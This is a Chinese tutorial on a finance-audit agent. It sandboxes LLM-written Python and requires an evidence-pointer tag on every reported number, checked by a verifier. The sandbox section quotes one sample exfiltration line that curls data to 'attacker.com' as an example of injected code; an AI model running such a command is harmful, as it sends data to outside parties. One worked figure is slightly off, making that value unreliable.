# 01 · 怎么让大模型算数不出错

这一篇讲整个项目最核心的一个想法：**让大模型不直接输出数字**。

听起来有点反直觉——这不是它最擅长的事吗？恰恰相反，数字是它最不擅长的事之一。我们下面会一步一步看为什么，以及怎么解决。

## 先看一个真实的例子

我前阵子让 GPT-4o 算一个简单的财务问题。题目是这样的：

> 一家公司 2024 年 Q3 营收 8,234,567.89 元，成本 5,123,456.78 元，税费 412,345.67 元。毛利润是多少？

它给了个答案：

> 毛利润 = 营收 − 成本 − 税费 = 8,234,567.89 − 5,123,456.78 − 412,345.67 = 2,698,765.44 元

看起来很专业，但你掏出计算器算一下：答案应该是 2,698,765.44。等等，还真是对的？

那再试一个：

> 请把 Q3 的毛利率按百分比写出来，保留两位小数。

它说：

> 毛利率 = 2,698,765.44 / 8,234,567.89 ≈ 32.77%

计算器一算：正确答案是 32.77%。对了。

再来：

> 如果 Q4 营收环比增长 8.2%，Q4 营收是多少？

它说：

> Q4 营收 = 8,234,567.89 × (1 + 8.2%) = 8,909,802.25 元

计算器：正确答案是 8,909,802.45。差了 0.2 元。

不多对吧？但这就是金融场景。差 0.2 元可能意味着某个季度利润少算了一笔钱，这笔钱对应一个存货减值，存货减值影响 EPS，EPS 影响股价。从用户的角度，AI 算的数字有一次对不上，他们就不会再信任这个系统。

这还只是小数相乘的简单例子。涉及百分位进位、千分位分隔、汇率换算、日期跨期、带单位的加减（万元 vs 亿元）——大模型出错的概率会呈阶梯上升。

## 为什么大模型在数字上靠不住

根本原因是：大模型在**做算术**，而不是**在计算**。

它看到 `8,234,567.89 × 1.082`，它没有启动一个计算器去乘。它是在训练语料里学过"形如 A × B 的表达式，结果大致长什么样"，然后一位一位地"写"出一个看起来合理的数字。

这种"写"出来的数字，绝大多数时候是对的（因为训练语料里这种运算很多）。但对得不绝对。具体错误率随任务复杂度上升，从 1% 到 10% 不等。在金融零容忍场景下，任何非零错误率都不能接受。

你可能想到一个自然的 workaround：**让 LLM 自己调计算器工具**（function calling）。这确实能解决一部分问题。但还有一个后续的坑——

## 第二个坑：LLM 会"复述"数字

假设你让 LLM 调了一个计算工具，拿到了精确值 `8909802.45`。现在你让它写一份 Markdown 报告，里面要展示这个数字。

它可能会写：

> Q4 营收预计达到约 890 万元，较 Q3 增长 8.2%。

看出来问题了吗？它把精确值"约等于"成了"约 890 万元"。这是很自然的自然语言习惯——人类写报告也这么写。但在审计场景里，这是灾难。

它还可能写成 `8,909,802.45 元`（对的）、`8909802.45 元`（对的但格式不对）、或者 `8,909,802.4 元`（少了一位小数）。你无法预测 LLM 哪次会用哪种格式。

换句话说：**光让 LLM 调工具还不够，你还得控制它"怎么把工具返回的数字写进自然语言"**。

## 我们的解法：沙箱 + Evidence-pointer 契约

一图看懂整条路径：LLM 只写代码，不直接输出数字；所有数字从沙箱的 `exec_id` / `cell` 回填；最后 `number_verifier` 扫一遍没带引证的数字就打回重写。

![沙箱 + 数字校验](images/sandbox-number-verifier.drawio.png)

方案分两步：

**第一步，算数这件事完全外包给沙箱。** LLM 不算数，它只写 Python 代码。代码交给一个叫"沙箱"的组件去执行，沙箱把结果以结构化的形式返回。

**第二步，报告里的每个数字都必须带一个引证标签，指向它的来源。** 不带引证的数字一律不算数，校验器扫到就打回让 LLM 重写。

我们把第二条规矩叫做 **Evidence-pointer 契约**（证据指针契约）。下面分别讲。

## 什么是"沙箱"

你可能听过这个词，但这里先定义清楚。**沙箱**（sandbox）是一个"受限的执行环境"——你在里面跑代码，但这段代码不能做一些危险的事情，比如：

- 访问文件系统（读 `/etc/passwd`）
- 发网络请求（偷数据到外网）
- 占用过多内存（触发 OOM 把主进程拖垮）
- 跑太久不结束（浪费 CPU）

在我们的场景里，沙箱的作用是执行 LLM 生成的 Python 代码。LLM 生成的代码我们信不过——它可能是正常的财务计算，也可能是被 prompt 注入诱导出来的恶意代码（比如 `import os; os.system('curl attacker.com?data=...')`）。

沙箱的核心价值：**即使代码恶意，也不会伤到外面**。

## 沙箱有哪几种实现方式

这是一个老问题，业界有成熟方案。按"隔离强度 - 性能"的 trade-off 排序，常见的有五种：

**1. RestrictedPython**。本项目本地用的就是它。它是 Python 社区一个很古老的库，做法是**在编译期改写字节码**：你写 `import os`，它拦住；你写 `open('/etc/passwd')`，它拦住。启动快（几乎零开销），但它跑在 Agent 主进程里，一旦有绕过漏洞，Agent 就裸奔。安全性弱，只适合本地开发。

**2. e2b**（商业云沙箱）。给你一个 HTTP API，每次执行都在独立的 MicroVM 里，冷启动 300-500 毫秒。隔离非常彻底，但要出网、要按秒计费。适合海外 SaaS 场景。国内用的话走代理、合规上要注意。

**3. Docker + gVisor**。Docker 提供基础的容器隔离，gVisor 是谷歌开源的"用户态 Linux 内核"，相当于在容器和宿主机之间多加一层隔离。冷启动 500-1000 毫秒，隔离强，但要自建 K8s 集群运维 `runsc`。

**4. nsjail + seccomp**。nsjail 是谷歌开源的 Linux 轻量级沙箱，用 Linux namespaces 做隔离，配合 seccomp 规则拦 syscall。冷启动 50 毫秒左右，性能好，隔离也强，但 seccomp profile 要精心调，初期 debug 成本不低。大厂（尤其是代码竞赛平台、在线编程教室）广泛在用。生产上这是我推荐的方案。

**5. Pyodide**（WASM）。把 Python 编译成 WebAssembly，跑在浏览器或者 wasm runtime 里。隔离最彻底（wasm 本身就是沙箱），但不支持 C 扩展，pandas 只能用阉割版。适合浏览器里的"轻量 Agent"。

我们项目的选择是：**本地开发用 RestrictedPython，生产推荐 nsjail + seccomp 或 e2b**。本地选 RestrictedPython 的原因是 macOS 上装 Docker/nsjail 太重，而 RestrictedPython conda 一装就能用。生产的切换方案我们在 `sandbox/e2b_runner.py` 里留了骨架。

## RestrictedPython 具体怎么工作

既然本地开发路径用到了它，这里顺带讲一下它的基本原理。

正常你写一段 Python：

```python
import os
x = os.listdir('/')
```

Python 解释器会编译成字节码，执行时调用 `os.listdir`。

RestrictedPython 做的事情是：**在编译阶段就重写这段字节码**。具体机制是：

- 把 `import` 换成它提供的 `safe_builtins.__import__`，这个版本只允许 import 一小串白名单模块
- 把 `[]` 运算改写成调用 `_getitem_`、`for x in y` 改写成调用 `_getiter_`——这两个 hook 里可以植入 guard 函数
- `open`、`exec`、`eval` 直接拦住

然后你把编译结果放进一个受限的 globals 字典里 `exec()`。因为那个字典里没有 `os` 这个变量，所以即使字节码绕过了 `__import__` 的拦截，`os` 也是 `NameError`。

我们的代码里在启动时把常用的财务库（pandas、numpy、Decimal）**预先放进 globals**，LLM 生成的代码就可以直接 `pd.DataFrame(...)` 而不需要 import。想 `import os` 的代码会在编译期就报错。

说是这么说，RestrictedPython 过去爆过几次 CVE（比如某个 AST 改写的边界情况可以绕过），它的维护者也承认它不是安全沙箱级别的产品。用它的价值是：
- 工程价值：可以直观看到“编译期防御”的思路
- 本地 demo 够用

**生产必须换到真正的沙箱。** 不应把 RestrictedPython 当成生产级隔离方案。

## 沙箱的代码长什么样

核心文件是 `fin_audit_agent/sandbox/runner.py` 里的 `run_code` 函数。简化版骨架是这样：

```python
def run_code(code: str, inputs: dict = None, timeout_sec: int = 10) -> ExecResult:
    # 1. 生成一个唯一的 exec_id，后面报告里会用它做引证
    exec_id = new_exec_id()

    # 2. 构造受限的全局命名空间：预置 pandas / numpy / Decimal
    safe_globals = _build_safe_globals()

    # 3. 注入用户变量（比如上游 SQL 查来的 DataFrame）
    local_ns = dict(inputs or {})

    # 4. 设置一个 SIGALRM 超时信号（Unix only）
    signal.alarm(timeout_sec)

    # 5. 用 RestrictedPython 编译
    byte_code = compile_restricted(code, "<sandbox>", "exec")

    # 6. 在受限命名空间里执行
    exec(byte_code, safe_globals, local_ns)

    # 7. 提取全大写变量作为 "cells"（后面 Drafter 会引用）
    cells = {k: v for k, v in local_ns.items() if k.isupper()}

    # 8. 把 DataFrame 存成 parquet、图表存成 png
    artifacts = save_artifacts(exec_id, cells)

    return ExecResult(exec_id=exec_id, ok=True, cells=cells, artifacts=artifacts, ...)
```

有几个设计决定值得单独说一下。

**为什么用"全大写变量"表示要导出的结果？** 这是一个约定。LLM 生成代码时，我们在 prompt 里告诉它："你要让 Drafter 引用的数值，用全大写变量名赋值。" 比如它会写：

```python
import pandas as pd
df = pd.DataFrame({"amt": [100, 200, 300]})
TOTAL_AMOUNT = df["amt"].sum()
AVG_AMOUNT = df["amt"].mean()
```

沙箱执行完后，自动扫所有全大写的变量，作为 `cells` 返回。这样约定的好处是：简单，LLM 很容易遵守；而且天然区分了"中间变量"和"导出值"——小写 `df`、`result` 这些不会被暴露出来。

**为什么要落盘 DataFrame，不直接返回？** 因为财务数据经常几千几万行。直接返回意味着塞进 LLM 的 context，context 会爆炸。我们的做法是：把 DataFrame 存成 parquet 文件（放在 `.artifacts/<exec_id>/` 目录下），返回一个引用（路径 + 前 5 行预览 + 行数）。Drafter 看到的是"这里有个 5000 行的表，前 5 行长这样"，它不需要完整数据就能写报告。真要看详情，用户点引证，前端从 parquet 拉。

**为什么要用 Decimal，不用 float？** 金融计算禁用 float。原因是 float 是二进制小数，有精度误差（`0.1 + 0.2 != 0.3`）。Decimal 是十进制小数，要求 28 位精度没问题。我们在沙箱启动时强制 `getcontext().prec = 28`，代码里用 `Decimal` 类型算。

## Evidence-pointer 契约是什么

刚才说了沙箱，现在回到第二步：**让 LLM 输出报告时，每个数字都必须带引证标签**。

我们约定的格式是这样：

```
本月总费用 21390.60 [[exec_id=a1b2c3d4e5f6#cell=TOTAL_AMOUNT]]
同比增长 8.2% [[exec_id=a1b2c3d4e5f6#cell=YOY_GROWTH]]
```

每个数字旁边紧跟着 `[[exec_id=XXX#cell=YYY]]`，明确指出这个数字来自**哪一次沙箱执行的哪一个变量**。

这个约定的核心作用是：**让 LLM 没法"写数字"，只能"引用数字"**。它可以从一堆 cells 里挑一个引用、可以做格式调整（比如把 0.0825 写成 8.25%），但它不能凭空输出一个 cells 里没有的数字。

有了这个约定之后，我们在 Drafter 节点后面加一个校验器：扫描报告文本，找出所有数字，确认每个数字都带标签、标签指向的 exec_id 存在、引用的 cell 在 cells 里能找到、cell 的真值和文本里的数字一致（允许格式化差异）。

校验不通过就打回让 Drafter 重写，最多重写 3 次。

## 校验器的实现逻辑

代码在 `fin_audit_agent/sandbox/number_verifier.py`。核心函数 `verify_numbers(text, cells_by_exec)` 做三件事：

**扫数字**。用正则抓所有"看起来像财务数字"的 token：带小数点的、带千分位逗号的、带百分号的。我们故意不抓单独的整数（比如"2024 年"、"第 3 季度"），避免误报。

**检引证**。每个抓到的数字，往后看一小段，必须紧跟着 `[[exec_id=...#cell=...]]` 的结构。没有就记一条 violation。

**对值**。把文本里的数字（清洗掉千分位和百分号）和 cell 的真值比较。有两个细节：
- 如果文本用了百分号（比如 `32.77%`），而 cell 里是小数（比如 `0.3277`），需要放大 100 倍再比
- 浮点比较用相对误差（1e-6），避免格式化造成的微小差异

返回一个 `VerifyReport`，包含 `ok`（总体是否通过）和 `violations[]`（每条违规的数字和原因）。如果不通过，Drafter 节点会把 `violations.render()` 的输出作为反馈再次喂给 LLM，让它重写。

## 为什么是"紧跟在数字后面"而不是"文末统一列引用"

这是一个经常被问的问题。很多传统的引文做法是"正文里编号，文末统一列出来"，像学术论文。为什么我们不用这种？

两个原因：

第一，**紧跟格式对 LLM 更友好**。LLM 在生成每个 token 的时候都能看到前文。写数字的当下，它只需要往后写一个紧跟的 `[[exec_id=...]]`，不需要在心里维护一个"回头要补引用"的列表。模型越小，越依赖这种"所见即所写"的结构。

第二，**紧跟格式便于自动校验**。我们只需要在每个数字附近的字符里找标签，不需要做复杂的跨段落关联。

代价是可读性——报告里一堆 `[[exec_id=a1b2c3...]]` 看着很乱。但这是给**程序**看的，不是给**用户**看的。真正展示给用户时，前端会把它渲染成一个小图标，点一下展开证据。

## 一个完整的例子

我们在 `examples/01_sandbox_number_verifier.py` 里放了一个端到端的 demo。跑一下：

```bash
conda activate fin-audit-agent
python examples/01_sandbox_number_verifier.py
```

脚本干了几件事：

```python
# 1. 在沙箱里跑一段财务计算
code = """
import pandas as pd
from decimal import Decimal

df = pd.DataFrame({
    "category": ["营销", "差旅", "办公", "营销"],
    "amount":   [Decimal("12000.50"), Decimal("3400.00"),
                 Decimal("890.10"),  Decimal("5100.00")],
})

TOTAL_AMOUNT = sum(df["amount"])
MARKETING_AMOUNT = sum(df.loc[df["category"] == "营销", "amount"])
NON_MARKETING_AMOUNT = TOTAL_AMOUNT - MARKETING_AMOUNT
"""

result = run_code(code)
# result.cells = {"TOTAL_AMOUNT": "21390.60", "MARKETING_AMOUNT": "17100.50", ...}
# result.exec_id = "a1b2c3d4e5f6"
```

然后模拟 Drafter 可能产生的两份报告，一份合规一份不合规：

```python
good = "本月总费用 21390.60 [[exec_id=a1b2c3d4e5f6#cell=TOTAL_AMOUNT]] ..."
bad  = "本月总费用 21390.60 元，营销费用 17100.50 元..."

report1 = verify_numbers(good, {"a1b2c3d4e5f6": result.cells})
# report1.ok = True

report2 = verify_numbers(bad, {"a1b2c3d4e5f6": result.cells})
# report2.ok = False
# report2.violations = [Violation("21390.60", 7, "missing_pointer"), ...]
```

在真实的 Drafter 节点里，`bad` 这种不合规的报告会触发 retry。LLM 会收到类似这样的反馈："你的报告里数字 21390.60 @pos=7 缺少 evidence-pointer，请修正。"然后重新写。最多试 3 次，都不行就告警。

## 产物存储：DataFrame 和图表怎么办

刚才说沙箱返回 `cells`，但实际业务里，LLM 经常生成画图或者返回大表格的代码。比如：

```python
import matplotlib.pyplot as plt
fig, ax = plt.subplots()
df.plot(kind='bar', x='month', y='amount', ax=ax)
# 这个 fig 不能塞进 cells——它是一个 matplotlib 对象
```

我们的做法是：执行完后，扫一遍 local_ns，找到 DataFrame 和 Figure，**存盘**：

- DataFrame → `<.artifacts/exec_id/name.parquet>`
- Figure → `<.artifacts/exec_id/name.png>`

存盘后，在 cells 里放一条占位："这里有个 5000 行的 DataFrame，引用在 `.artifacts/...`"。LLM 看到这条占位就知道"有这么个东西"，要展示就把路径写到报告里，前端渲染时自己去读。

这样做的好处：
- 不撑 LLM 上下文
- 产物可以长期归档，审计时能回放
- 跨请求复用——用户问"这张图能不能再调整一下"，我们能找到原图

## 沙箱相关的安全检查清单

如果你要把这个项目上生产，沙箱这部分建议按下面的 checklist 过一遍：

- [ ] 把 RestrictedPython 换成 nsjail + seccomp 或 e2b
- [ ] 容器 `--network=none`（彻底断网）
- [ ] `--memory=512m --cpus=1`（限资源）
- [ ] `--read-only + --tmpfs /work`（只有一个可写目录）
- [ ] `--cap-drop=ALL`（不给任何 Linux capability）
- [ ] seccomp profile 只允许 ~60 个必要 syscall
- [ ] 沙箱镜像最小化，不装 curl/wget/ssh
- [ ] Python 里 `getcontext().prec = 28`（Decimal 精度）
- [ ] 超时机制（Unix 用 SIGALRM，Docker 用 timeout 参数）
- [ ] 产物落盘到独立目录，不同请求互不干扰

## 常见问题

**问：为什么不直接让 LLM 调计算器函数？**

答：我们做了，但不够。单个计算调函数能解决，但复杂任务（比如"先查数据库再做一串计算"）涉及大量中间变量，函数调用的 overhead 太大，而且 LLM 在写报告时仍然会复述数字。沙箱 + 全大写变量约定 + Evidence-pointer，是一套更彻底的方案。

**问：如果 LLM 写的代码在沙箱里执行错了（比如除以 0），怎么办？**

答：`ExecResult.ok = False`，`error` 字段里带异常信息。上游节点拿到失败的 result 会把错误反馈给 LLM 让它改，最多 3 次。实在不行就回到 Clarify 节点问用户。

**问：Evidence-pointer 会不会被 LLM 故意伪造？比如它写 `1234 [[exec_id=fake#cell=X]]`。**

答：校验器会查 `fake` 这个 exec_id 是不是真实存在（存在于我们本次请求的所有 sandbox_execs 里）。伪造的 exec_id 会被标记为 `unknown_exec`。

**问：生产环境沙箱冷启动 50-300ms，延迟高怎么办？**

答：用预热的沙箱池。比如常驻 10 个空闲的 nsjail 容器，每次请求从池里拿一个，用完销毁，池里再补一个。这样用户感知的延迟只有"拿容器 + 执行"，通常 10 毫秒以内。

**问：用户能不能看到沙箱里代码的执行过程（类似 Jupyter）？**

答：我们留了接口但没实现 streaming。要做的话，沙箱 runner 里加 WebSocket 推 stdout / stderr，前端像 Jupyter 一样滚动显示。这是一个不错的产品功能，但不是核心。

## 要深入了解的话

推荐按这个顺序看：

1. `fin_audit_agent/sandbox/result_schema.py`——先看数据结构定义
2. `fin_audit_agent/sandbox/runner.py`——本地沙箱的实现
3. `fin_audit_agent/sandbox/number_verifier.py`——校验器
4. `fin_audit_agent/sandbox/e2b_runner.py`——生产沙箱的接入骨架
5. `tests/test_sandbox_isolation.py`——沙箱相关的测试
6. `examples/01_sandbox_number_verifier.py`——端到端 demo

看完之后，Evidence-pointer 这个想法应该就完全理解了。它是本项目的核心创新，也是"让 LLM 在金融场景落地"最关键的一道护栏。
